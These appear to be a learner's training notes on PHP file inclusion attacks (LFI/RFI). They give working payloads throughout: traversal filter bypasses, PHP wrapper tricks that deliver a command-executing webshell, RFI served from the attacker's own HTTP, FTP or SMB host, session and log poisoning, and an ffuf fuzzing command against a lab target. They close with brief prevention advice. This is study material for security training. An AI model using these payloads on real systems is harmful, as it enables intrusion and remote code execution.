#CWES #fileinclusion #LFI #phpwrappers #RFI #fileupload #traversal

#### Lessons:
- If you get LFI one place, remember to use it to read source code
- TODO: Do this assignment again, some wierd behavior.

#### Idea:
- The web app loads a file from a given path (to somehow change the content of the page), if we can manipulate which file gets loaded, we can do bad things.

NOTE: Not all file inclusion vulnerabilities execute the file, some only read them. Some allow remote urls, and some only allow files from the local backend. 

If we can read the source code on how the files are included, we can check if it matches some of these: It will help us know the scope of what we can do.
![[Pasted image 20260707102523.png]]


#### LFI:
- Try to understand how the file is fetched and what is it doing/ changing  
- Check if it looks for  the relative or the absolute path. If relative try path traversal

Then we can try to make it read some default files
- /etc/passwd
- C:\Windows\boot.ini

**Second-order LFI attacks:**
- A functionality lets us upload a file, and then we reference it later 
- A trick here could be to call the file something malicious such as `/../../etc/passwd`, and another functionality reference this filename and instead interact with the real passwd file. 

**Bypassing filters:**
- Adding more /-es and ..-s, ....//....//....// instead of ../../../
- URL encode the traversal
- Start from a whitelisted directory and traverse
- Sometimes the app appends a extension to our file, so we dont want: shell.php.php. Insted name the payload just shell or find a way to cancel out the extension. 


**Reading vs executing files:**
- Some files we access are executed, like the en.php examples - it changes the rendered html in the browser to english.
- But if we want to READ the en.php file we can do so by base64 encoding it:
```
php://filter/read=convert.base64-encode/resource=en.php
```

#### PHP wrappers:
- standardize modules that allows us to perform actions, one examples of these is the convert base64 wrapper above.

**Data wrapper**
- Can be used to include external data, including php code. 
- The  `allow_url_include` setting needs to be set in the php configurations. This config is usually located her: (x.y is the php version)
```
etc/php/X.Y/apache2/php.ini
```
- If it is set, we can send base64 encoded data via: `data://text/plain;base64,<payload>`

Ex.
gen payload
```
echo '<?php system($_GET["cmd"]); ?>' | base64
```

deploy payload, execute id on the target
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

**Input wrapper**
- include external input and execute php.
- depend on  `allow_url_include` 
- Works via POST requests

Ex.
```shell
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

**Expect wrapper**
- for directly running commands, similar to a webshell
 - depend on  `allow_url_include` 
 - Also the expect extension needs to be installed 

Ex.
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```


**Zip wrapper**
- Can zip a file phpshell file and use the zip wrapper to unzip it
Ex.
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
(we make the zip file have a .jpg extension to bypass the image filetype verification)

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
- Once uploaded we can access it like above


**Phar wrapper**
- Similar idea as zip wrapper
- Make a php shell that compiles into a phar file 
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Then upload it, and access it:
```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```



#### RFI:
**goals:**
- Enumerate local-only ports and web apps -> SSRF vector
- RCE by including malicious script 

Functions that typical functions that can allow us to include remote files:
![[Pasted image 20260707134028.png]]

NOTE: RFI => LFI usually.

- allow_url_include must the allowed, for RFI to be present 

When deploying webshell via RFI, we can do the basic http version:
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```shell
sudo python3 -m http.server <LISTENING_PORT>
```

OR we can do it via FTP:
```shell
sudo python -m pyftpdlib -p 21
```

OR if we are attacking windows server (preferably on the same network, we can transfer file via SMB):
```shell
impacket-smbserver -smb2support share $(pwd)
```
- Note on windows we do not need additional settings for getting access to files on a smb share.

Then go to:
`....index.php?language=\\<OUR_IP>\share\shell.php?cmd=whoami`


#### File upload and LFI:
- If we can upload a file then reference it via LFI, we can do damage.
- The trick here is that the upload function does not have to be vulnerable, as long as we can upload the file and have the include function reference it we have a vector. 

#### Session poisoning
- If the web app stores a file with our session information, and we can access this file, we might poison it and execute code

PHPSESSID
- `/var/lib/php/sessions/` (linux)
- `C:\Windows\Temp\`
- Example name: `sess_el4ukv0kqbvoirg7nkp4dncpk3` `sess_PHPSESSID`

IDEA: if we can control some of the information that gets saved in our session file, we can poison it and execute code with it. 

Ex.
```
http://<SERVER_IP>:<PORT>/index.php?language=<payload>
```
- Our session language preference gets set to the payload 

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fds&cmd=id
```
- We include our session file, and add our cmd to the php shell we uploaded in the payload. 
Q: Why do we use & instead of ? here to spesify the cmd? 


NOTE: The same way we poison the session file, we can poison other stuff that gets stored on the server. Example web server logs, change stuff that is user-controlled like user-agent to our payload.


#### Fuzzing for LFI:
- Good wordlist: https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt 
- More wordlists: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI 
- Linux spesiffic: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
- Windows spesiffic: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows 

We want to find parameters on the page, sometimes these are hidden for us. So we need to fuzz for parameters aswell. 

What we look for:
- File that can give us more details on how the app works, config files, env files, credential files, source code files, ssh keys.
- POC that we have a parameter that we can use for LFI

#### Prevent file inclusion vulnerabilities:
- Avoid passing user-controlled input into file inclusions or apis, but if we do sanitize the input.
- If there exists standardized sanitizing functionalities in our web framework, consider using them.
- Configure the web server to not enable functionalities that are not needed by the application.

#### Assignment:
- We can upload any type of file it looks like, can upload php webshell
- How can we access the file we uploaded(?)


/thanks.php?n=shell -> not usefull, no check that this is a real name
/api/image.php?p=<> -> uses a actual filename, we can look for LFI.

Fuzz the image api:
```
ffuf -w LFI-WordList-Linux.txt -u "http://154.57.164.71:31266/api/image.php?p=....//....//....//....//FUZZ" 
```

- Can read: /api/image.php?p=....//....//....//....//var/log/nginx/access.log.
- Should read source code to understand the other apis, and see where our webshell got uploaded. 


